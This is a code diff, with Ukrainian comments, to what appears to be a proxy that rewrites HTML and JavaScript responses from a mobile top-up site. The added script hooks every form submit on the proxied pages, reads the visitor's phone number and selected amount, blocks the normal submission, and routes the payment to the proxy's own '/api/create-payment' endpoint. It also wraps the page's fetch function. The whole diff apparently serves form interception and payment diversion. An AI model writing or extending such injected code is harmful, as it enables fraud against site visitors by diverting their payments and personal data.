@@ -134,6 +134,33 @@ async function modifyHTML(response) {
         }, 500);
       }
 
+      // Отримати вибрану суму з радіокнопок
+      function getSelectedAmountFromRadios() {
+        // Перевіряємо радіокнопки з name="recharge_number[amount]"
+        const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
+        if (selectedRadio) {
+          console.log('Found selected amount radio:', selectedRadio.value);
+          return selectedRadio.value;
+        }
+        
+        // Перевіряємо будь-які інші радіокнопки зі словом amount
+        const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
+        if (otherRadio) {
+          console.log('Found other amount radio:', otherRadio.value);
+          return otherRadio.value;
+        }
+        
+        // Якщо немає вибраних радіокнопок, перевіряємо data-amount
+        const amountEl = document.querySelector('[data-amount]');
+        if (amountEl) {
+          console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
+          return amountEl.getAttribute('data-amount');
+        }
+        
+        console.log('No amount radio found, using default 5');
+        return '5';
+      }
+
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
         if (sourceEvent) {
           sourceEvent.preventDefault();
@@ -174,8 +201,10 @@ async function modifyHTML(response) {
           }
           
           if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
-            amount = document.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
+            amount = getSelectedAmountFromRadios() || '5';
           }
+          
+          console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
           
           const response = await fetch('/api/create-payment', {
             method: 'POST',
@@ -211,12 +240,33 @@ async function modifyHTML(response) {
           autoProgressAfterCheckNumber();
         }
         
+        // Перехоплюємо всі форми
         document.querySelectorAll('form').forEach(form => {
+          console.log('Form found:', form.id || form.name || 'unnamed form');
+          
           form.addEventListener('submit', function(event) {
-            const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
-            const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-            const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
-            window.processPayment(amount, phoneNumber, event);
+            console.log('Form submit intercepted:', form.id || form.name);
+            
+            // Перевіряємо, чи це форма з вибором суми
+            const hasAmountRadios = form.querySelector('input[name="recharge_number[amount]"]');
+            if (hasAmountRadios) {
+              console.log('Form has amount radios');
+              const selectedAmount = getSelectedAmountFromRadios();
+              console.log('Selected amount:', selectedAmount);
+            
+              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
+              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+              console.log('Phone from form:', phoneNumber);
+              
+              window.processPayment(selectedAmount, phoneNumber, event);
+              return false;
+            } else {
+              // Для інших форм
+              const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
+              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
+              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+              window.processPayment(amount, phoneNumber, event);
+            }
           });
         });
 
@@ -312,6 +362,33 @@ async function modifyJavaScript(response) {
         return origFetch.call(this, url, options);
       };
     })();
+    
+    // Отримати вибрану суму з радіокнопок
+    function getSelectedAmountFromRadios() {
+      // Перевіряємо радіокнопки з name="recharge_number[amount]"
+      const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
+      if (selectedRadio) {
+        console.log('Found selected amount radio:', selectedRadio.value);
+        return selectedRadio.value;
+      }
+      
+      // Перевіряємо будь-які інші радіокнопки зі словом amount
+      const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
+      if (otherRadio) {
+        console.log('Found other amount radio:', otherRadio.value);
+        return otherRadio.value;
+      }
+      
+      // Якщо немає вибраних радіокнопок, перевіряємо data-amount
+      const amountEl = document.querySelector('[data-amount]');
+      if (amountEl) {
+        console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
+        return amountEl.getAttribute('data-amount');
+      }
+      
+      console.log('No amount radio found, using default 5');
+      return '5';
+    }
     
     // Автоматичний перехід до наступного кроку після перевірки номера
     (function() {
